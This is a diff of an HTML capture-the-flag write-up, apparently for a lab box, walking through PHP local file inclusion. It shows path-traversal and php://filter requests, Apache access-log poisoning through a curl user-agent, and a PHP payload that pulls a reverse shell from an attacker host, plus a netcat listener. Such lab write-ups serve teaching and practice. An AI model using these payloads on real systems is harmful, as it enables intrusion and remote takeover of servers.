@@ -4279,7 +4279,7 @@ Apache/2.4.38 (Debian)
 
 Warning: include(): Failed opening &#39;somethingwithdog.php&#39; for inclusion (include_path=&#39;.:/usr/local/lib/php&#39;) in /var/www/html/index.php on line 24
 </code></pre></div>
-<p>So we know the page requires us to include dog (or cat) in the view-parameter of the request and then includes a file with whatever is in the view-parameter followed by ".php".</p>
+<p>So we know the page requires us to include dog (or cat) in the view-parameter of the request and then includes a file with whatever is in the view-parameter followed by ".php". But the file does not have to be in the same directory as the programmer had intended, maybe we can try to add a relative path to the file name.</p>
 <p>We know the website is served using apache 2.4.38 (from opening /server-status and running nmap) so we could have a look at well known apache files e.g. the log files. Just to be safe, fell free to add as many ../ as you want :D</p>
 <div class="highlight"><pre><span></span><code>?view=./cat/../../../../../../../../var/log/apache2/access.log
 </code></pre></div>
@@ -4287,7 +4287,7 @@ Warning: include(): Failed opening &#39;somethingwithdog.php&#39; for inclusion 
 <h4 id="log-poisoning">Log Poisoning</h4>
 <p>Based on how we can manipulate the view paramenter, this page may be vulnerable to <a href="https://blog.sqreen.com/local-file-inclusions-explained/">Local File Inclusion</a>.</p>
 <p>With 'php://filter/convert.base64-encode/resource=' we can convert the given resource to base64
-With './cat/../index' we add they keyword cat and move back to the main web folder and chose index.php</p>
+With './cat/../index' we add they keyword cat and move back to the main web folder and choose index.php</p>
 <div class="highlight"><pre><span></span><code>?view=php://filter/convert.base64-encode/resource=./cat/../index
 </code></pre></div>
 <p>This results in the following string which is the base64 encoded representation of the index.php:</p>
@@ -4328,7 +4328,7 @@ With './cat/../index' we add they keyword cat and move back to the main web fold
 <p>Now lets try looking at the apache2 access.log files again (this time with the "ext" parameter):</p>
 <div class="highlight"><pre><span></span><code>?view=./cat/../../../../../../../../var/log/apache2/access<span class="err">&amp;</span>ext=.log
 </code></pre></div>
-<p>Sucecss! We can see the logs (our visits). The logs basically contain the URL request including parameters and the user-agent.</p>
+<p>Success! We can see the logs (our visits). The logs basically contain the URL request including parameters and the user-agent.</p>
 <p>If you feel lucky, you could've guessed that there is a flag.php in the main folder of the website and try view this by misusing the view? parameter as follows:</p>
 <div class="highlight"><pre><span></span><code>?view=php://filter/convert.base64-encode/resource=./cat/../flag
 </code></pre></div>
@@ -4337,19 +4337,19 @@ With './cat/../index' we add they keyword cat and move back to the main web fold
 <div class="highlight"><pre><span></span><code><span class="nb">echo</span> <span class="s2">&quot;PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2d=&quot;</span> <span class="p">|</span> base64 --decode
 </code></pre></div>
 <p>However, this was a lucky guess... maybe there is another way to get there...</p>
-<p>We can try to inject PHP code to the access.log and trigger the code by visiting the page. Let's try running a request e.g.:</p>
+<p>We can try to inject PHP code to the access.log and trigger the code by visiting the page. Remember from above, there are two things we can manipulate at request time that are written to the logs, the URL request including parameters and the user-agent. Let's try running a request e.g.:</p>
 <div class="highlight"><pre><span></span><code>?view=./cat/../../<span class="cp">&lt;?php echo &quot;HI!&quot;;?&gt;</span>
 ```html
 
 Unfortunantly this fails as e.g. all spaces are URL encoded. However, there are clear spaces visible in the user-agent. Let&#39;s try to change the user-agent string:
 
 ```sh
-curl -A &quot;<span class="cp">&lt;?php echo &quot;HI!&quot;;?&gt;</span>&quot; http://10.10.209.48
+curl -A &quot;<span class="cp">&lt;?php echo &quot;HI!&quot;;?&gt;</span>&quot; http://10.10.46.238
 </code></pre></div>
 <p>Success! The user-agent string can be used to inject PHP code. Let's use this to download a php reverse shell.</p>
 <h3 id="reverse-shell">Reverse shell</h3>
 <p>Kali comes with some reverse shells e.g. <a href="http://pentestmonkey.net/tools/php-reverse-shell">php-reverse-shell</a> "/usr/share/webshells/php/php-reverse-shell.php".</p>
-<p>Let's create a copy of this file and modify the two input fields marked with "// CHANGE THIS"</p>
+<p>Let's create a copy of this file and modify the two input fields marked with "// CHANGE THIS". The IP address to put here belongs to our kali machine.</p>
 <div class="highlight"><pre><span></span><code>$ip = &#39;10.9.182.239&#39;;  // CHANGE THIS
 $port = 9999;          // CHANGE THIS
 </code></pre></div>
@@ -4360,11 +4360,11 @@ $port = 9999;          // CHANGE THIS
 <div class="highlight"><pre><span></span><code>nc -lvnp <span class="m">9999</span>
 </code></pre></div>
 <p>Now let's run a GET request with a custom user-agent that includes PHP to get the reverse-shell</p>
-<div class="highlight"><pre><span></span><code>curl -A <span class="s2">&quot;&lt;?php file_put_contents(&#39;shell.php&#39;,file_get_contents(&#39;http://10.9.182.239:9090/shell.php&#39;)); ?&gt;&quot;</span> http://10.10.209.48
+<div class="highlight"><pre><span></span><code>curl -A <span class="s2">&quot;&lt;?php file_put_contents(&#39;shell.php&#39;,file_get_contents(&#39;http://10.9.182.239:9090/shell.php&#39;)); ?&gt;&quot;</span> http://10.10.46.238
 </code></pre></div>
 <p>Alternatively we could use any other tool to send a GET request with custom user-agent string. E.g. burp-suite or write a python script like so:</p>
 <div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
-<span class="nb">print</span> <span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://10.9.182.239/?view=cat&#39;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;&lt;?php file_put_contents(&quot;shell.php&quot;,file_get_contents(&quot;http://10.9.182.239:9090/shell.php&quot;)); ?&gt;&#39;</span><span class="p">,})</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+<span class="nb">print</span> <span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://10.10.46.238/?view=cat&#39;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;&lt;?php file_put_contents(&quot;shell.php&quot;,file_get_contents(&quot;http://10.9.182.239:9090/shell.php&quot;)); ?&gt;&#39;</span><span class="p">,})</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
 </code></pre></div>
 <p>Use the previous technique to include the access log again:</p>
 <div class="highlight"><pre><span></span><code>?view=./cat/../../../../../../../../var/log/apache2/access<span class="err">&amp;</span>ext=.log
